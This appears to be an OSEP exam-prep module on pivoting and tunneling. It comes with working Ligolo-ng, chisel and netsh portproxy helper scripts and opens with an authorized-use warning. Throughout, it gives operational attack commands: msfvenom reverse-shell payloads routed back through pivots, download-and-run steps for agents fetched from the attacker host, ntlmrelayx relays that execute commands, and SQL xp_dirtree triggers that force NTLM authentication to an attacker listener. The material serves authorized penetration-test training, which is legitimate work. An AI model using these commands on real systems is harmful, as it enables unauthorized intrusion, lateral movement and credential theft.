::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 08 · Pivoting & tunneling (port forwarding)

> Scenarios 34–35. Core of lateral movement: **internal reachability ≠ your reachability** — treat the two directions separately.
>
> Lab files: `m08-ligolo-ng-setup.sh`, `m08-chisel-socks.sh`, `m08-port-forward.ps1`.
>
> Keywords: `Ligolo-ng` `SSHUTTLE` `Autoroute` `Socks`.

---

## 1. One-line conclusions for both scenarios

| Scenario | Problem | Conclusion |
|---|---|---|
| 34 | Internal site only accepts a specific subnet (Kali direct connect refused; controlled DEV host can reach it) | Use **local/dynamic forwarding** to bring the pivot’s reachability back to Kali; afterward every payload address must match the **same callback path as the pivot** |
| 35 | SOCKS forward access to internal SQL/domain services is OK, but target **active auth** (callback) never reaches your listener | Forward (you initiate) and target-initiated callback are **two different paths**; put the receive point where the **target can reach** (pivot/agent host), then forward back to the Kali listener |

**Do not**: because forward works, put Kali’s `LHOST` into parameters for target-initiated connects (UNC paths, payload LHOST, auth callback addresses). The target→Kali path may not exist — this mistake burns the most time.

---

## 2. Three forwarding directions (decide before you act)

| Type | Who listens | Who initiates | Typical command | Solves |
|---|---|---|---|---|
| Local forward `-L` | Local (Kali) | Kali | `ssh -L 127.0.0.1:8081:TARGET:8081 USER@PIVOT` | Kali needs an internal service (scenario 34 main path) |
| Dynamic/SOCKS `-D` | Local (Kali) | Kali | `ssh -D 1080 USER@PIVOT` / chisel / msf socks_proxy | Arbitrary tools via proxy into the internal net (probe/enum/forward connect) |
| Remote/reverse forward `-R` / listener | Host reachable from the target (pivot/agent) | Target initiates | ligolo `listener_add`, netsh portproxy, `ssh -R` | Target-initiated callbacks (reverse shell, NTLM auth callback — scenario 35) |
| Ligolo full subnet | Your Kali (tun iface) | Kali | `ip route add 172.16.X.0/24 dev ligolo` | Whole internal range as if local |

**Essence of scenario 35**: a SOCKS proxy only carries connections **initiated by Kali**. When a target process (SQL `xp_dirtree`, reverse shell, auth callback) connects, it uses the **target’s own routing** — SOCKS cannot help. You must open a receive port on a host the target can reach, then tunnel that connection back to the Kali listener.

**Port/address discipline**: use one shared address/port plan across stages (see `docs/00` port table: 11601=Ligolo proxy, 1080=SOCKS, 8081=example internal web); after changing any parameter, verify with a harmless connect — never assume.

---

## 3. Scenario 34: Internal site only accepts a specified subnet

### Situation
Kali’s direct connect to an internal site is refused (ACL only allows a given subnet), but a controlled DEV-net host can reach it; behind the site (example web06:8081) there is upload or command execution; the end goal is entry plus callback.

### Assumptions
- You control the DEV host, and Kali → DEV has a usable path (SSH creds / executable payload / Ligolo agent / chisel client).
- Internal site IP is known (e.g. `172.16.X.50:8081`) and only the DEV subnet is allowed.
- The web host behind upload/RCE **may not be able to callback to Kali**; design the callback for a path it can reach (usually = DEV host or a receive port you open in the DEV subnet).

### Prepare (attacker)
```bash
# Pre-reserve: local 8081 (forward port), 1080 (SOCKS), 11601 (ligolo)
mkdir -p ~/osep/tools ~/osep/logs
# Binaries under ~/osep/tools: ligolo_proxy_linux / ligolo_agent_windows.exe / chisel / sshuttle
# (see m08-*-setup.sh dependency notes)
```

### Procedure
**Step 0 · Confirm the pivot egress** (decides which tunnel):
```bash
# On DEV, confirm it really reaches the internal site (in an existing shell / tunnel)
curl -s -o /dev/null -w '%{http_code}\n' http://172.16.X.50:8081/
# Confirm DEV → Kali egress (this decides how you build the callback direction)
```

**Step 1 · Build Kali → DEV forwarding** (pick one by what you have):

Option A: DEV has SSH (simplest) — local forward + dynamic proxy together:
```bash
ssh -N -L 127.0.0.1:8081:172.16.X.50:8081 -D 1080 USER@DEV_IP
# Browser/tools: http://127.0.0.1:8081 (local forward); other internal probes via 127.0.0.1:1080 SOCKS
```

Option B: Ligolo-ng (DEV can run the agent, Windows/Linux) — see `m08-ligolo-ng-setup.sh`:
```bash
# Kali: proxy + tun + route (script subcommands proxy / route)
sudo ip route add 172.16.X.0/24 dev ligolo
# proxy console: session → start; then Kali hits http://172.16.X.50:8081 directly
```
If the internal site runs on DEV itself (another common shape), use Ligolo’s special local-forward IP — no full subnet route needed:
```bash
sudo ip route add 240.0.0.1/32 dev ligolo   # 240.0.0.1 → DEV loopback
curl http://240.0.0.1:8081/
```

Option C: chisel (DEV can run chisel client) — see `m08-chisel-socks.sh`.

**Step 2 · Verify internal site reachability + find upload/RCE**:
```bash
curl -s http://127.0.0.1:8081/ -o /dev/null -w '%{http_code}\n'   # expect 200/302
# All later upload/RCE interaction stays on this working path — do not switch back to Kali’s direct address
```

**Step 3 · After execution on the web side, design the callback address** (critical): web-host callback target = **a receive port you can open on DEV**, forwarded through the tunnel to the Kali listener. Ligolo reverse-listener template:
```
# Kali terminal 1: real shell listener
rlwrap -cAr nc -lvnp 4444
# Kali terminal 2 (ligolo proxy console): agent(DEV) listens 0.0.0.0:PORT, forwards to Kali 127.0.0.1:4444
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4444 --tcp
listener_list
# Generated payload LHOST=DEV internal IP, LPORT=4445 (never Kali IP)
#   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<DEV_IP> LPORT=4445 -f exe -o rev.exe
# After web-side exec: web host → DEV:4445 → ligolo tunnel → Kali 127.0.0.1:4444
```
A Windows DEV pivot can also use `m08-port-forward.ps1` portproxy for the equivalent forward.

### Lab files
- `m08-ligolo-ng-setup.sh` (proxy/agent/route/reverse subcommands)
- `m08-chisel-socks.sh` (alternate forward + proxychains)
- `m08-port-forward.ps1` (netsh portproxy when DEV is Windows)

### Verify
1. `curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/` returns a non-refuse status.
2. From the web entry, fire a harmless callback (e.g. `nc <DEV_IP> 4445` / one download) to confirm the full chain before the real payload.
3. After the reverse shell: immediately `whoami`, `ipconfig /all` — confirm you landed on the **web host**, not the pivot.

### If it fails
1. **Local 8081 already in use** → switch to `127.0.0.1:18081`, update the URL; do not steal 11601/1080.
2. **SSH option unavailable (no creds/firewall)** → switch to Ligolo or chisel; as long as DEV can run an agent, you do not need an SSH service.
3. **Site still unreachable** → on DEV first `curl` to prove the site is reachable; ACL may be port/protocol-specific — try http→https or another target port.
4. **Callback payload never reaches DEV:4445** → harmless TCP test first (web-side `nc` or command injection `ping`) to confirm web→DEV; if not, place another agent/listener in the same DEV subnet as a relay.

### Exam / OPSEC notes
- Ligolo with `-selfcert` (cleartext channel): fine for the exam; do not burn time on certs; **do not claim encryption in production/report writeups**.
- One listener per forward port; confirm with `listener_list` / `ss -tlnp` that nothing is double-bound.
- Harmless verify before real payload — missing one check in a forward chain stacks errors (wrong address + wrong port + wrong protocol is the slowest triage).

---

#### `m08-ligolo-ng-setup.sh`

````bash
#!/usr/bin/env bash
# Purpose: Ligolo-ng end-to-end helper — start proxy, tun/route, agent delivery, reverse forward, file transfer, double pivot
# Scenario: M08 scenarios 34/35 (internal ACL forward, target-initiated callback sink) — see docs/08-pivoting-tunneling.md
# Depends: ligolo_proxy_linux / ligolo_agent under ~/osep/tools, sudo (ip tuntap/route), python3 (http.server delivery)
# Usage: bash m08-ligolo-ng-setup.sh <subcommand> [args]
#       proxy            [PORT]              # create tun iface and start proxy (-selfcert)
#       agent            [LHOST] [PORT]      # Kali HTTP delivery + print target download/run commands
#       route            NETWORK[/24]        # full subnet route (e.g. 172.16.40.0/24)
#       route-local                          # 240.0.0.1/32 → agent host loopback (site on agent itself)
#       reverse          AGENT_PORT KALI_PORT# target-initiated callback: print listener_add + payload address template
#       file             AGENT_PORT KALI_PORT FILE  # send a Kali file to the target via the tunnel
#       double           SECOND_TUN NETWORK  # second tun + forward 11601 (double pivot)
# Placeholders: LHOST=attacker-reachable IP; PORT=proxy port (default 11601); AGENT_PORT=agent-side receive; KALI_PORT=Kali listener
# Test status: passed bash -n (no ligolo binary / no tun rights here — not runtime-tested); interactive commands must be run by hand in the proxy console
set -euo pipefail

TOOLS="${HOME}/osep/tools"
PROXY_BIN="${TOOLS}/ligolo_proxy_linux"
AGENT_BIN="${TOOLS}/ligolo_agent_windows.exe"
TUN="ligolo"
KALI_PORT_DEFAULT=11601

say()  { printf '\033[1;32m[*] %s\033[0m\n' "$*"; }
info(){ printf '\033[1;34m   %s\033[0m\n' "$*"; }
warn(){ printf '\033[1;33m[!] %s\033[0m\n' "$*" >&2; }

usage(){ sed -n '5,17p' "$0" | sed 's/^# //'; exit 1; }

ensure_bin(){ [[ -x "$1" ]] || { warn "missing $1 — download and chmod +x first (under ~/osep/tools)"; exit 1; }; }

# Create / bring up tun iface
tun_up(){
  local name="$1" user; user="$(id -un)"
  sudo ip tuntap add user "$user" mode tun "$name" 2>/dev/null || true   # ignore if already exists
  sudo ip link set "$name" up
  ip link show "$name" >/dev/null 2>&1 || { warn "tun iface $name not ready"; exit 1; }
}

cmd_proxy(){
  local port="${1:-$KALI_PORT_DEFAULT}"
  ensure_bin "$PROXY_BIN"
  tun_up "$TUN"
  say "starting Ligolo proxy (-selfcert, cleartext channel — enough for exam), port $port"
  say "then in proxy console:  session → start"
  [[ "$port" != "$KALI_PORT_DEFAULT" ]] && info "agent connect port must match $port"
  "$PROXY_BIN" -selfcert -port "$port"
}

cmd_agent(){
  local lhost="${1:-}"; local port="${2:-$KALI_PORT_DEFAULT}"
  [[ -z "$lhost" ]] && { warn "usage: $0 agent LHOST [PORT]"; exit 1; }
  [[ -f "$AGENT_BIN" ]] || { warn "missing $AGENT_BIN"; exit 1; }
  (cd "$TOOLS" && python3 -m http.server 80) &   # delivery dir = ~/osep/tools
  say "HTTP delivery on port 80 (logs follow this terminal)"
  say "on target (PowerShell) run:"
  info "iwr -uri http://${lhost}/ligolo_agent_windows.exe -UseBasicParsing -OutFile ligolo_agent.exe"
  info ".\ligolo_agent.exe -connect ${lhost}:${port} -ignore-cert"
  say "after agent checks in, proxy console:  session → start"
}

cmd_route(){
  local net="${1:-}"; [[ -z "$net" ]] && { warn "usage: $0 route NETWORK/24"; exit 1; }
  tun_up "$TUN"
  sudo ip route add "$net" dev "$TUN" 2>/dev/null || true
  say "route added (repeat is ignored): $net dev $TUN"
  info "verify: ip route list | grep $TUN"
  say "back in proxy console confirm session is started — then Kali can hit that subnet directly"
}

cmd_route_local(){
  tun_up "$TUN"
  sudo ip route add 240.0.0.1/32 dev "$TUN" 2>/dev/null || true
  say "240.0.0.1/32 → agent host loopback (Ligolo local port-forward special IP)"
  info "when the site is on the agent host: curl http://240.0.0.1:8081/ or nmap 240.0.0.1 -sV"
}

cmd_reverse(){
  local agent_port="${1:-}"; local kali_port="${2:-}"
  [[ -z "$agent_port" || -z "$kali_port" ]] && { warn "usage: $0 reverse AGENT_PORT KALI_PORT"; exit 1; }
  say "target-initiated callback template (scenario 35 sink) — start the real Kali listener first:"
  info "rlwrap -cAr nc -lvnp ${kali_port}"
  say "then in proxy console (agent listens 0.0.0.0:AGENT_PORT, forwards to Kali 127.0.0.1:KALI_PORT):"
  info "listener_add --addr 0.0.0.0:${agent_port} --to 127.0.0.1:${kali_port} --tcp"
  info "listener_list"
  say "addresses in payload/trigger params = agent host internal IP + ${agent_port} (never Kali public IP):"
  info "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AGENT_IP> LPORT=${agent_port} -f exe -o rev.exe"
}

cmd_file(){
  local agent_port="${1:-}"; local kali_port="${2:-}"; local fname="${3:-}"
  [[ -z "$fname" ]] && { warn "usage: $0 file AGENT_PORT KALI_PORT FILE"; exit 1; }
  say "in proxy console run:"
  info "listener_add --addr 0.0.0.0:${agent_port} --to 127.0.0.1:${kali_port} --tcp"
  say "on Kali serve the file (from its directory):"
  info "python3 -m http.server ${kali_port}"
  say "on target download (IP in URL = agent host internal IP):"
  info "Invoke-WebRequest -Uri \"http://<AGENT_IP>:${agent_port}/${fname}\" -OutFile ${fname}"
}

cmd_double(){
  local tun2="${1:-ligolo_double}"; local net2="${2:-}"
  [[ -z "$net2" ]] && { warn "usage: $0 double SECOND_TUN NETWORK/24"; exit 1; }
  say "double pivot (second agent joins via first hop)"
  tun_up "$tun2"
  say "1) proxy console (inside first-hop session):"
  info "listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp"
  info "listener_list"
  say "2) second target agent connect address = first-hop agent host IP:"
  info "ligolo_agent.exe -connect <FIRST_PIVOT_IP>:11601 -ignore-cert"
  say "3) after second-hop session is up: session (switch to second hop) → start; Kali adds second-layer route:"
  info "sudo ip route add ${net2} dev ${tun2}"
  info "ip route list | grep ${tun2}"
}

[[ $# -ge 1 ]] || usage
case "$1" in
  proxy)  shift; cmd_proxy "$@";;
  agent)  shift; cmd_agent "$@";;
  route)  shift; cmd_route "$@";;
  route-local) cmd_route_local;;
  reverse) shift; cmd_reverse "$@";;
  file)   shift; cmd_file "$@";;
  double) shift; cmd_double "$@";;
  *) usage;;
esac
````

#### `m08-chisel-socks.sh`

````bash
#!/usr/bin/env bash
# Purpose: chisel tunnel fallback (SOCKS / single-service forward / reverse sink when Ligolo unavailable) + proxychains helper
# Scenario: M08 scenario 34 (internal web via pivot) and 35 (target-initiated callback sink) — see docs/08-pivoting-tunneling.md
# Depends: chisel (Kali ~/osep/tools/chisel Linux build; Windows build delivered to target), sudo (to edit /etc/proxychains4.conf)
# Usage: bash m08-chisel-socks.sh <subcommand> [args]
#       server            [PORT]              # Kali chisel server --reverse (default 8080)
#       client-socks      SERVER_ADDR         # print target cmd: R:1080:socks → Kali 127.0.0.1:1080 egress is the target
#       client-forward    SERVER_ADDR LKALI TARGET TPORT  # print target cmd: Kali local LKALI → TARGET:TPORT
#       rev-serve         [PORT]              # scenario 35: start chisel server on a target-reachable host (receive side)
#       rev-client        PIVOT_ADDR PORT KALI_PORT  # scenario 35: Kali client R:PORT:127.0.0.1:KALI_PORT
#       proxychains                             # append socks5 line to /etc/proxychains4.conf and show usage
# Placeholders: SERVER_ADDR=Kali chisel server (IP:PORT); PIVOT_ADDR=scenario-35 receive-side host
# Test status: passed bash -n (no chisel here — not runtime-tested); for chisel R: the listener is on the server side, egress on the client side
set -euo pipefail

TOOLS="${HOME}/osep/tools"
CHISEL="${TOOLS}/chisel"

say()  { printf '\033[1;32m[*] %s\033[0m\n' "$*"; }
info(){ printf '\033[1;34m   %s\033[0m\n' "$*"; }
warn(){ printf '\033[1;33m[!] %s\033[0m\n' "$*" >&2; }

usage(){ sed -n '5,15p' "$0" | sed 's/^# //'; exit 1; }

# Topology (memorize before acting — wrong direction = no tunnel):
#   L:xx listens on the chisel client; R:xx listens on the chisel server.
#   R: egress is on the client side — so when Kali is server and the target is client,
#   R:socks / R:PORT:TARGET:PORT gives Kali usable ports with traffic exiting from the target.

cmd_server(){
  local port="${1:-8080}"
  [[ -x "$CHISEL" ]] || { warn "missing $CHISEL"; exit 1; }
  say "Kali chisel server (--reverse), port $port"
  "$CHISEL" server -p "$port" --reverse
}

cmd_client_socks(){
  local addr="${1:-}"; [[ -z "$addr" ]] && { warn "usage: $0 client-socks KALI_SERVER:PORT"; exit 1; }
  say "on target (target must egress to ${addr}):"
  info "chisel.exe client ${addr} R:1080:socks"
  say "on Kali, proxychains via 127.0.0.1:1080 into the internal net (egress = target):"
  info "bash $0 proxychains    # after auto-writing socks5 config:"
  info "proxychains4 -q netexec mssql targets.txt -u 'USER' -p 'PASS'"
}

cmd_client_forward(){
  local addr="${1:-}"; local lport="${2:-}"; local target="${3:-}"; local tport="${4:-}"
  [[ -z "$tport" ]] && { warn "usage: $0 client-forward KALI_SERVER:PORT KALI_LPORT TARGET TPORT"; exit 1; }
  say "on target (Kali hits 127.0.0.1:${lport} → ${target}:${tport}, scenario 34 single-service forward):"
  info "chisel.exe client ${addr} R:${lport}:${target}:${tport}"
  say "Kali verify:"
  info "curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:${lport}/"
}

cmd_rev_serve(){
  local port="${1:-9310}"
  say "scenario 35 receive side: on the [host the target can reach] (e.g. internal pivot) start chisel server:"
  info "./chisel server -p ${port}"
  say "ensure that host is reachable from the target (same subnet / firewall allows ${port})"
}

cmd_rev_client(){
  local paddr="${1:-}"; local lport="${2:-}"; local kport="${3:-}"
  [[ -z "$kport" ]] && { warn "usage: $0 rev-client PIVOT_ADDR LISTENPORT KALI_PORT"; exit 1; }
  say "on Kali first start the auth/callback sink (root; stop smbd before binding 445):"
  info "sudo ntlmrelayx.py -t smb://TARGET -smb2support -c 'whoami'     # listen ${kport}"
  say "on Kali run (client connects to receive host; R: makes that host listen on ${lport} and forward to Kali ${kport}):"
  info "$CHISEL client ${paddr} R:${lport}:127.0.0.1:${kport}"
  say "trigger-parameter address = receive-host internal IP:${lport} (e.g. SQL: EXEC master..xp_dirtree '\\\\<PIVOT_IP>\\share')"
}

cmd_proxychains(){
  local conf="/etc/proxychains4.conf"
  sudo test -w "$conf" || { warn "need sudo to write $conf"; exit 1; }
  if ! grep -qs '^socks[45][[:space:]]*127\.0\.0\.1[[:space:]]*1080' "$conf"; then
    echo "socks5 127.0.0.1 1080" | sudo tee -a "$conf" >/dev/null
    say "wrote: socks5 127.0.0.1 1080 (comment out older proxy lines first if present)"
  else
    say "$conf already has a socks line for 127.0.0.1:1080 — skipped"
  fi
  say "usage examples:"
  info "proxychains4 -q netexec smb 172.16.X.0/24 -u USER -p PASS"
  info "proxychains4 -q curl http://172.16.X.50:8081/"
}

[[ $# -ge 1 ]] || usage
case "$1" in
  server)         shift; cmd_server "$@";;
  client-socks)   shift; cmd_client_socks "$@";;
  client-forward) shift; cmd_client_forward "$@";;
  rev-serve)      shift; cmd_rev_serve "$@";;
  rev-client)     shift; cmd_rev_client "$@";;
  proxychains)    cmd_proxychains;;
  *) usage;;
esac
````

#### `m08-port-forward.ps1`

````powershell
<#
Purpose: Forward helper on a Windows pivot — netsh portproxy (forward/sink) and ssh -L/-R tunnels, with firewall allow and cleanup
Scenario: M08 scenario 34 (pivot exposes an internal site/service) and 35 (open a receive port on the pivot back to Kali’s auth listener) — see docs/08-pivoting-tunneling.md
Depends: PowerShell 3+; netsh portproxy needs admin; ssh tunnels need OpenSSH client (ssh.exe) on the host
Usage: powershell -ep bypass -f m08-port-forward.ps1 -Mode Add -ListenPort 8081 -ConnectAddress 172.16.50.10 -ConnectPort 8081
       powershell -ep bypass -f m08-port-forward.ps1 -Mode Remove -ListenPort 8081
       powershell -ep bypass -f m08-port-forward.ps1 -Mode Show
       powershell -ep bypass -f m08-port-forward.ps1 -Mode SshTunnel -Forward Local -ListenPort 8081 -ConnectAddress 172.16.50.10 -ConnectPort 8081 -SshUser root -SshHost 10.10.14.5 -SshKey ~/.ssh/id_rsa
       Scenario 35 example (sink on pivot toward Kali): -Mode Add -ListenAddress <PIVOT_IP> -ListenPort 445 -ConnectAddress <KALI_IP> -ConnectPort 445
Placeholders: PIVOT_IP=pivot internal IP; KALI_IP=attacker-reachable IP; TARGET/TARGET_PORT=final internal service
Test status: Not run on Windows (host is macOS); netsh args and common failure branches checked by hand
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][ValidateSet('Add', 'Remove', 'Show', 'SshTunnel')][string]$Mode,
    [string]$ListenAddress = "0.0.0.0",          # portproxy listen address (default all interfaces)
    [int]$ListenPort = 0,                        # port opened on the pivot (required for Add/SshTunnel)
    [string]$ConnectAddress = "",                # forward target (Add: internal service IP; scenario 35: Kali IP)
    [int]$ConnectPort = 0,
    [ValidateSet('Local', 'Remote')][string]$Forward = 'Local',  # ssh -L / -R
    [string]$SshHost = "", [string]$SshUser = "", [string]$SshKey = "",
    [switch]$AddFirewallRule,
    [switch]$RemoveFirewallRule
)

function Show-ErrorAndExit($msg) { Write-Error $msg; exit 1 }

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)

switch ($Mode) {
    'Add' {
        if (-not $isAdmin) { Show-ErrorAndExit "netsh portproxy needs admin (re-run from an elevated window)" }
        if ($ListenPort -le 0 -or -not $ConnectAddress -or $ConnectPort -le 0) {
            Show-ErrorAndExit "Add needs -ListenPort / -ConnectAddress / -ConnectPort"
        }
        # Clear same binding first to avoid duplicate-add errors
        netsh interface portproxy delete v4tov4 listenport=$ListenPort listenaddress=$ListenAddress 2>$null
        netsh interface portproxy add v4tov4 listenport=$ListenPort listenaddress=$ListenAddress `
            connectport=$ConnectPort connectaddress=$ConnectAddress
        if ($LASTEXITCODE -ne 0) { Show-ErrorAndExit "portproxy add failed (exit $LASTEXITCODE)" }
        Write-Output "[+] portproxy: $ListenAddress`:$ListenPort -> $ConnectAddress`:$ConnectPort"
        if ($AddFirewallRule) {
            netsh advfirewall firewall add rule name="fp-in-$ListenPort" dir=in action=allow `
                protocol=TCP localport=$ListenPort | Out-Null
            Write-Output "[+] allowed inbound TCP $ListenPort (rule name fp-in-$ListenPort)"
        }
        Write-Output "[i] verify: netsh interface portproxy show all ; rollback: $PSCommandPath -Mode Remove -ListenPort $ListenPort"
    }
    'Remove' {
        if (-not $isAdmin) { Show-ErrorAndExit "netsh portproxy needs admin" }
        if ($ListenPort -le 0) { Show-ErrorAndExit "Remove needs -ListenPort" }
        netsh interface portproxy delete v4tov4 listenport=$ListenPort listenaddress=$ListenAddress 2>$null
        Write-Output "[-] removed portproxy $ListenAddress`:$ListenPort"
        if ($RemoveFirewallRule) {
            netsh advfirewall firewall delete rule name="fp-in-$ListenPort" | Out-Null
            Write-Output "[-] removed firewall rule fp-in-$ListenPort"
        }
    }
    'Show' {
        netsh interface portproxy show all
        Write-Output "`n[i] IPv4 forward rules above; connections/occupancy: netstat -ano | findstr LISTENING"
    }
    'SshTunnel' {
        $ssh = Get-Command ssh.exe -ErrorAction SilentlyContinue
        if (-not $ssh) { Show-ErrorAndExit "ssh.exe not found — without OpenSSH client use -Mode Add (netsh)" }
        if ($ListenPort -le 0 -or -not $ConnectAddress -or $ConnectPort -le 0 -or -not $SshHost -or -not $SshUser) {
            Show-ErrorAndExit "SshTunnel needs -ListenPort / -ConnectAddress / -ConnectPort / -SshHost / -SshUser"
        }
        $sshArgs = @('-N')
        # Local (-L): local ListenPort -> ConnectAddress:ConnectPort (scenario 34); Remote (-R): remote listen -> local
        # Note: ssh -R binds remote loopback by default; remote sshd needs GatewayPorts for other hosts to connect (see docs/08 scenario 35 fallback)
        $spec = if ($Forward -eq 'Local') {
            "127.0.0.1:$ListenPort`:$ConnectAddress`:$ConnectPort"
        } else {
            "0.0.0.0:$ListenPort`:$ConnectAddress`:$ConnectPort"
        }
        $flag = if ($Forward -eq 'Local') { '-L' } else { '-R' }
        $sshArgs += @($flag, $spec)
        if ($SshKey) { $sshArgs += @('-i', $SshKey) }
        $sshArgs += @('-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=30')
        $sshArgs += "$($SshUser)@$SshHost"
        Write-Output "[i] running: ssh $($sshArgs -join ' ')   (Ctrl+C to drop the tunnel)"
        & $ssh.Source $sshArgs
    }
}
````

## 4. Scenario 35: Proxy can reach the internal target, but target-initiated auth never hits your listener

### Situation
You can reach internal SQL or domain services via SOCKS (forward OK), but when you trigger the target to **connect outbound** (SQL auth/relay, NTLM callback) nothing arrives at the listener. Forward access and target callback are different paths (basis: C4 SQL auth and relay situations).

### Assumptions
- You already have SOCKS/tunnel forward access to the internal target (`proxychains ... mssql` / domain queries work).
- The target process (SQL Server, domain host) can initiate outbound connects to **some host in the same subnet**, but **not to Kali** (firewall/ACL/segmentation).
- You control a host in the target subnet (Ligolo agent / Windows pivot), or have a place there where you can run a binary.

### Prepare (attacker)
```bash
# Kali: auth sink + relay tools ready (run as root; SMB 445 needs privilege)
sudo systemctl stop smbd   # free 445 or responder/ntlmrelayx will not bind
sudo rlwrap responder -I eth0 -A    # or
sudo ntlmrelayx.py -t smb://TARGET_IP -smb2support -c 'whoami'   # relay variant
```
Confirm Kali’s local listen port (445/HTTP) matches the tunnel’s **`--to` 127.0.0.1 port**.

### Procedure
**Step 0 · Confirm “two paths”**: forward OK via proxychains does **not** mean the target can reach Kali. On a target-reachable host (agent/pivot), open a temporary listener and trigger one connect from the target side — see whether it arrives.

**Step 1 · Open a receive port where the target can reach (prefer Ligolo-ng listener; direction = reverse forward)**:
```
# Kali terminal 1: auth sink (real listen on Kali)
sudo ntlmrelayx.py -t smb://<internal-target> -smb2support ...    # listen 0.0.0.0:445
# Kali terminal 2 (ligolo proxy console): agent listens 0.0.0.0:445 on the target side → forward to Kali 127.0.0.1:445
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
listener_list
```
**Step 2 · Address in trigger params = agent host (the IP the target can reach), not Kali**:
```sql
-- On target SQL, trigger outbound SMB auth (example: UNC directory listing)
EXEC master..xp_dirtree '\\<AGENT_INTERNAL_IP>\share';
-- or xp_subdirs / xp_fileexist; low-priv SQL can often still trigger (see [11-mssql](/modules/11-mssql))
```
Auth packet path: target → `<AGENT_INTERNAL_IP>:445` → Ligolo tunnel → Kali 127.0.0.1:445 (ntlmrelayx/responder). Arrival means relay or capture the hash.

**Step 3 · Windows pivot alternative (netsh portproxy, when the pivot can egress to Kali)**:
```powershell
# On Windows pivot (admin): listen pivot 445 → forward to Kali ntlmrelayx
netsh interface portproxy add v4tov4 listenport=445 listenaddress=<PIVOT_IP> connectport=445 connectaddress=<KALI_IP>
# Trigger params become \\<PIVOT_IP>\share; verify: netsh interface portproxy show all
```
Requires: pivot→Kali:445 egress allowed (agent/beacon egress usually implies this); target→pivot:445 allowed.

**Step 4 · Linux pivot fallback (ssh -R; sshd must allow external bind)**:
```bash
# Run from Kali; bind pivot 0.0.0.0:445, forward to Kali 127.0.0.1:445
ssh -N -R 0.0.0.0:445:127.0.0.1:445 USER@PIVOT_IP
# sshd needs GatewayPorts clientspecified/yes; otherwise -R binds loopback only and the target cannot connect — confirm before relying on it
```

### Lab files
- `m08-ligolo-ng-setup.sh` (`reverse` subcommand — standard reverse-forward template)
- `m08-port-forward.ps1` (Windows pivot portproxy, with rollback/cleanup)
- Trigger-side templates: [11-mssql](/modules/11-mssql) and [16-ics-calendar](/modules/16-ics-calendar) (auth-trigger techniques)

### Verify
1. `listener_list` shows the listener; `ss -tlnp` shows 445 / the target port really listening on Kali.
2. After trigger, ntlmrelayx/responder prints the auth source IP — should be the **target/relay party**, not Kali itself.
3. Relay success: command/session on the target host; if only capturing hashes, confirm hash format matches your cracker.

### If it fails
1. **Still no auth arrives** → back to Step 0: temporary `nc -lvnp` on a target-reachable host, manually trigger one TCP connect from the target side, decide “path broken” vs “trigger params ineffective” — change one variable at a time.
2. **445 occupied / bind fails** → on Kali first `sudo systemctl stop smbd`; use a non-privileged port (e.g. 4455) as the `--to` target and sync the trigger side… (SMB auth must be 445; if relaying to 445 is constrained, switch to ntlmrelayx HTTP relay or responder capture then crack/replay the hash).
3. **Target can only reach local loopback** (SQL and pivot are the same host / pivot is on the target) → place the agent/forwarder **on the target itself**; trigger address `127.0.0.1` (when ligolo agent runs on the target, `--addr 0.0.0.0:445` is local).
4. **Ligolo unavailable** → pick among chisel / netsh portproxy / ssh -R whichever matches “target can reach” (pivot shape decides).

### Exam / OPSEC notes
- Trigger auth **once** — do not spam; confirm the listener is up before each trigger.
- SMB/HTTP relay needs target and relay **same subnet and SMB signing off** (probe first); EPA/signing conditions: [12-ad-attacks](/modules/12-ad-attacks) ESC8 and [16-ics-calendar](/modules/16-ics-calendar).
- Address consistency rule: IP in trigger params is always “the host the target can reach”; port is always “the tunnel port opened on that target-side host” — write both down and reproduce them.

---

## 5. Tool choice quick map (outside this module’s scope: not expanded)

| Need | First choice | Fallback | Notes |
|---|---|---|---|
| Hit one internal web (scenario 34) | ssh `-L` (pivot has SSH) | ligolo 240.0.0.1 / chisel `R:` | avoid port clashes with 11601/1080 |
| Whole internal range like local | Ligolo-ng full subnet route | sshuttle (pivot has SSH, needs root) | sshuttle weak on ICMP/UDP |
| Arbitrary tools via proxy | proxychains + SOCKS (msf socks_proxy / chisel `R:socks` / ssh `-D`) | add `socks5 127.0.0.1 1080` to `proxychains4` | confirm trailing proxy line in `/etc/proxychains4.conf` |
| Target-initiated callback sink (scenario 35) | Ligolo `listener_add --to 127.0.0.1:LPORT` | netsh portproxy / ssh `-R` | receive side always where the target can reach |
| Metasploit in-session routing | `post/multi/manage/autoroute` + `auxiliary/server/socks_proxy` | `route` / `route flush` | SESSION platform mismatch warnings are usually harmless |
| Double pivot (third layer) | Ligolo second tun + `listener_add 0.0.0.0:11601 --to 127.0.0.1:11601` | recurse the same pattern | one tun iface per layer — do not reuse |

Metasploit quick notes:
```
msf6 > use post/multi/manage/autoroute      # set SESSION / SUBNET / NETMASK
msf6 > use auxiliary/server/socks_proxy     # set SRVHOST 127.0.0.1 / SRVPORT 1080 / VERSION 4a
```
sshuttle quick notes (when pivot has SSH — more stable than proxychains for transparent internal web):
```bash
sudo sshuttle -v -e "ssh -i id_rsa" -r USER@PIVOT_IP 172.16.X.0/24
# then curl http://172.16.X.50:8081/ directly — no proxy prefix
```

---

## 6. Related docs

| Doc | Contents |
|---|---|
| [00-environment-and-infra](/modules/00-environment-and-infra) | Port plan (11601/1080/8081…), logging discipline |
| [11-mssql](/modules/11-mssql) | Scenario 35 auth-trigger techniques (`xp_dirtree`, etc.) |
| [16-ics-calendar](/modules/16-ics-calendar) | Another shape of externally triggered auth |
| [09-c2-egress-channels](/modules/09-c2-egress-channels) | Egress channels and “same path for every stage” |
| `m08-ligolo-ng-setup.sh` etc. | Lab-file usage for this module |
